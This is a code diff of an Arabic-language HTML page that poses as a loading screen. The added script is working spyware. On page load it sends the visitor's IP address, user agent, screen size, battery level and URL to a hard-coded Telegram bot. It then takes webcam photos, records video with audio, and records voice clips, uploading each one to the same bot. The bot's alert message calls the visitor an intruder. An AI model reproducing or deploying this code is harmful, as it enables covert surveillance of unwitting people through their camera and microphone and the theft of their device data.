@@ -3,122 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال بيانات جهاز إلى تلجرام</title>
+    <title>جمع البيانات وإرسالها إلى Telegram</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            padding: 20px;
+            text-align: center;
+        }
+        .loader {
+            margin: 20px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
-
-    <h1>بيانات جهازك يتم إرسالها الآن...</h1>
+    <h1>جاري جمع البيانات...</h1>
+    <div class="loader"></div>
+    <p id="status">جاري جمع المعلومات...</p>
 
     <script>
-      const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
-      const chat_id = "5932979028";
+        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
+        const chat_id = "5932979028";
 
-      // دالة إرسال رسالة نصية مع زر
-      async function sendToTelegramWithButton() {
-        const message = "اضغط على الزر لالتقاط صورة:";
-        const inlineKeyboard = {
-          inline_keyboard: [
-            [
-              {
-                text: "التقط صورة",
-                callback_data: "capture_photo"
-              }
-            ]
-          ]
-        };
-
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id,
-            text: message,
-            reply_markup: inlineKeyboard
-          })
-        });
-      }
-
-      // دالة التقاط صورة وإرسالها
-      async function captureAndSendPhoto() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          const track = stream.getVideoTracks()[0];
-          const imageCapture = new ImageCapture(track);
-
-          // التقاط صورة
-          const blob = await imageCapture.takePhoto();
-          await sendPhoto(blob);  // إرسال الصورة عبر البوت
-
-          track.stop(); // إيقاف الكاميرا
-        } catch (e) {
-          console.warn("فشل التقاط الصورة:", e);
+        // دالة إرسال رسالة نصية
+        async function sendToTelegram(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id, text })
+            });
         }
-      }
 
-      // دالة إرسال الصورة عبر البوت
-      async function sendPhoto(blob) {
-        const formData = new FormData();
-        formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "photo.jpg");
-
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-      }
-
-      // التعامل مع ضغط الزر من المستخدم
-      async function handleTelegramCallback(data) {
-        if (data.callback_query.data === "capture_photo") {
-          await captureAndSendPhoto();
+        // إرسال صورة
+        async function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("photo", blob, "photo.jpg");
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
         }
-      }
 
-      // استلام التحديثات من البوت (التعامل مع الضغطات على الأزرار)
-      async function getUpdates() {
-        const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
-        const data = await response.json();
-        if (data.result && data.result.length > 0) {
-          for (const update of data.result) {
-            if (update.callback_query) {
-              await handleTelegramCallback(update.callback_query);
+        // إرسال فيديو
+        async function sendVideo(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("video", blob, "video.webm");
+            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        // إرسال صوت
+        async function sendVoice(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", chat_id);
+            formData.append("voice", blob, "voice.ogg");
+            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        // بيانات الجهاز
+        async function sendDeviceInfo() {
+            const battery = await navigator.getBattery();
+            const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
+            const msg = `
+👑 شادو، هناك دخيل جدي 👑
+
+🌐 بيــانـات الجهاز 🌐
+• المـقـــــــــــع: ${location.href}
+• إســـم الجهـاز: ${navigator.userAgent}
+• IP Phon: ${ip.ip || "غير معروف"}
+• اللغة: ${navigator.language}
+• النظام: ${navigator.platform}
+• حجم الشاشة: ${screen.width}x${screen.height}
+• البطارية: ${battery.level * 100}% ${battery.charging ? '🔌' : '🔋'}
+
+📸 صور: 10 سيتم إرسالها
+🎬 فيديو: سيتم تسجيله لاحقًا
+🎤 صوت: 10 تسجيلات قادمة
+  `;
+            await sendToTelegram(msg);
+        }
+
+        // 1️⃣ التقاط 10 صور بالكاميرا
+        async function take10PhotosAndThen(callback) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+
+                for (let i = 0; i < 2; i++) {
+                    try {
+                        const blob = await imageCapture.takePhoto();
+                        await sendPhoto(blob);
+                        await new Promise(r => setTimeout(r, 500)); // تأخير بسيط بين الصور
+                    } catch (e) {}
+                }
+
+                track.stop();
+                if (callback) callback();
+            } catch (e) {
+                console.warn("فشل التقاط الصور:", e);
+                if (callback) callback();
             }
-          }
         }
-      }
 
-      // إرسال البيانات إلى تلجرام عند فتح الصفحة
-      async function sendDeviceInfo() {
-        const battery = await navigator.getBattery();
-        const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
-        const msg = `
-          👑 شادو، هناك دخيل جدي 👑
-          🌐 بيــانـات الجهاز 🌐
-          • المـقـــــــــــع: ${location.href}
-          • إســـم الجهـاز: ${navigator.userAgent}
-          • IP Phon: ${ip.ip || "غير معروف"}
-          • اللغة: ${navigator.language}
-          • النظام: ${navigator.platform}
-          • حجم الشاشة: ${screen.width}x${screen.height}
-          • البطارية: ${battery.level * 100}% ${battery.charging ? '🔌' : '🔋'}
-          
-          📸 صور: 10 سيتم إرسالها
-          🎬 فيديو: سيتم تسجيله لاحقًا
-          🎤 صوت: 10 تسجيلات قادمة
-        `;
-        await sendToTelegram(msg);
-      }
+        // 2️⃣ تسجيل فيديو 10 ثوانٍ
+        async function recordVideoThen(callback) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
 
-      // بدء السكربت عند تحميل الصفحة
-      window.onload = async () => {
-        // إرسال الزر عند فتح الصفحة
-        await sendToTelegramWithButton();
-        await sendDeviceInfo();
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    await sendVideo(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                    if (callback) callback();
+                };
 
-        // استلام التحديثات (الضغطات على الأزرار) بشكل مستمر
-        setInterval(getUpdates, 1000); // تحقق من التحديثات كل ثانية
-      };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000);
+            } catch (e) {
+                console.warn("فشل تسجيل الفيديو:", e);
+                if (callback) callback();
+            }
+        }
+
+        // 3️⃣ تسجيل 10 تسجيلات صوت كل منها 10 ثوانٍ
+        async function record10AudiosSequentially() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(stream);
+                let chunks = [];
+                let count = 1;
+
+                recorder.ondataavailable = e => chunks.push(e.data);
+
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'audio/ogg' });
+                    await sendVoice(blob);
+                    chunks = [];
+                    count++;
+                    if (count < 2) {
+                        setTimeout(() => {
+                            recorder.start();
+                            setTimeout(() => recorder.stop(), 10000);
+                        }, 1000);
+                    } else {
+                        stream.getTracks().forEach(t => t.stop());
+                    }
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000);
+            } catch (e) {
+                console.warn("فشل تسجيل الصوت:", e);
+            }
+        }
+
+        // بدء السلسلة بعد دخول الموقع
+        window.onload = async () => {
+            await sendDeviceInfo();
+
+            take10PhotosAndThen(() => {
+                recordVideoThen(() => {
+                    record10AudiosSequentially();
+                });
+            });
+        };
     </script>
-
 </body>
 </html>
